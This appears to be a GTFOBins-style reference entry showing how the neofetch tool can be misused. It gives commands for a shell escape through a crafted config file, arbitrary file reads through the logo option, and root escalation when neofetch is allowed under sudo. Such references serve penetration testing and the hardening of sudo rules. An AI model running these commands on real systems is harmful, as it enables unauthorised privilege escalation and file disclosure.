# GTFOBin: neofetch

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
TF=$(mktemp)
echo 'exec /bin/sh' >$TF
neofetch --config $TF
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files.

```
LFILE=file_to_read
neofetch --ascii $LFILE
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
TF=$(mktemp)
echo 'exec /bin/sh' >$TF
sudo neofetch --config $TF
```